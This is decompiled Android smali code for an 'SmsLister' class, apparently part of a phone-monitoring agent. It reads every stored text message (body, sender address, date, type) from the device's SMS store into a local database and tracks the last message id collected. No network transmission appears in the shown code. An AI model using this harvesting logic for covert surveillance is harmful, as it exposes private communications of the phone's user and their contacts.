.class public Lcom/hp/vd/module/monitor/sms/SmsLister;
.super Ljava/lang/Object;
.source "SmsLister.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "SmsLister"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SmsData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;


# direct methods
.method public constructor <init>(Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/sms/SmsObserver;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SmsData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/sms/SmsObserver;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 39
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 26
    iput-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 27
    iput-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->context:Lcom/hp/vd/context/Context;

    .line 28
    iput-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 40
    iput-object p1, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 41
    iput-object p2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->context:Lcom/hp/vd/context/Context;

    .line 42
    iput-object p3, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 43
    iput-object p4, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    .line 44
    iput-object p5, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 13

    .line 50
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/sms/SmsObserver;->deactivate()V

    .line 52
    new-instance v0, Lcom/hp/vd/module/monitor/sms/Columns;

    invoke-direct {v0}, Lcom/hp/vd/module/monitor/sms/Columns;-><init>()V

    const-string v1, "content://sms/"

    .line 58
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 60
    iget-object v2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v8

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v9, 0x3

    const/4 v10, 0x2

    const/4 v11, 0x0

    .line 64
    :try_start_0
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v7, "_id"

    move-object v2, v8

    move-object v3, v1

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2
    :try_end_0
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 106
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SmsLister"

    const-string v3, "SecurityException caught (without projection)"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception v2

    move-object v12, v2

    .line 73
    iget-object v2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SmsLister"

    const-string v4, "SQLiteException caught while quering SMS cursor. Now trying without projection."

    invoke-interface {v2, v3, v4, v12}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 v2, 0x5

    .line 75
    new-array v4, v2, [Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "_id"

    aput-object v2, v4, v11

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "type"

    const/4 v3, 0x1

    aput-object v2, v4, v3

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "body"

    aput-object v2, v4, v10

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "address"

    aput-object v2, v4, v9

    const/4 v2, 0x4

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "date"

    aput-object v3, v4, v2

    const/4 v5, 0x0

    const/4 v6, 0x0

    .line 86
    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v7, "_id"

    move-object v2, v8

    move-object v3, v1

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_5
    .catch Ljava/lang/SecurityException; {:try_start_1 .. :try_end_1} :catch_4

    :goto_0
    if-nez v2, :cond_0

    .line 112
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SmsLister"

    const-string v2, "Cursor (content://sms/) is NULL"

    invoke-interface {v0, v1, v2, v9}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 121
    :cond_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SmsLister"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "run(): sms have been found = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v2}, Landroid/database/Cursor;->getCount()I

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v1, -0x1

    .line 123
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    .line 127
    :goto_1
    :try_start_2
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_1

    add-int/lit8 v11, v11, 0x1

    .line 129
    new-instance v3, Lcom/hp/vd/data/SmsData;

    invoke-direct {v3}, Lcom/hp/vd/data/SmsData;-><init>()V

    .line 131
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "_id"

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SmsData;->internalId:Ljava/lang/Integer;

    .line 132
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "type"

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SmsData;->type:Ljava/lang/String;

    .line 133
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "body"

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SmsData;->content:Ljava/lang/String;

    .line 134
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "address"

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SmsData;->address:Ljava/lang/String;

    .line 135
    new-instance v4, Ljava/util/Date;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "date"

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v5

    invoke-direct {v4, v5, v6}, Ljava/util/Date;-><init>(J)V

    iput-object v4, v3, Lcom/hp/vd/data/SmsData;->createdAt:Ljava/util/Date;

    .line 137
    iget-object v4, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->dao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v4, v3}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 139
    iget-object v3, v3, Lcom/hp/vd/data/SmsData;->internalId:Ljava/lang/Integer;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    move-object v1, v3

    goto :goto_1

    .line 148
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SmsLister"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "run(): sms listed = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v0, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 149
    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    .line 155
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_sms_id"

    invoke-virtual {v0, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 158
    :try_start_3
    iget-object v2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_sms_id"

    invoke-virtual {v2, v3, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 159
    iget-object v2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "gather_sms_on_start"

    const-string v4, "false"

    invoke-virtual {v2, v3, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 161
    iget-object v2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    .line 162
    iget-object v3, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v2, v3}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 164
    iget-object v2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SmsLister"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "run(): commited max_sms_id = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 169
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->smsObserver:Lcom/hp/vd/module/monitor/sms/SmsObserver;

    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/sms/SmsObserver;->activate()V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_2

    :catch_2
    move-exception v1

    .line 172
    iget-object v2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "gather_sms_on_start"

    const-string v4, "true"

    invoke-virtual {v2, v3, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 174
    iget-object v2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SmsLister"

    const-string v4, "run(): could not commit max_sms_id and mark smsLister as already started."

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 180
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_sms_id"

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 182
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SmsLister"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "run(): reverted max_sms_id to the old value = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v1, v2, v0, v10}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :goto_2
    return-void

    :catch_3
    move-exception v0

    .line 143
    iget-object v2, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SmsLister"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Exception caught during read/write: maxId: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v2, v3, v1, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    .line 100
    :catch_4
    iget-object v0, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SmsLister"

    const-string v2, "SecurityException caught (with projection)"

    invoke-interface {v0, v1, v2, v12}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_5
    move-exception v0

    .line 95
    iget-object v1, p0, Lcom/hp/vd/module/monitor/sms/SmsLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SmsLister"

    const-string v3, "SQLiteException caught while quering SMS cursor with projection. Nothing more to try. Exiting..."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
